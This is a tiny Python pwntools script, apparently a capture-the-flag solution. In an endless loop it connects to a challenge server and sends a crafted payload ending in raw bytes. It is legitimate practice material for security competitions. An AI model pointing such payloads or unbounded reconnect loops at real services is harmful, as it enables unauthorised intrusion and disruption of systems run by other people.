from pwn import *


while True:
    p = remote('challenge.acictf.com', 31813)
    p.sendline('HELLOaaaa\x01\x00')
    print p.recvall()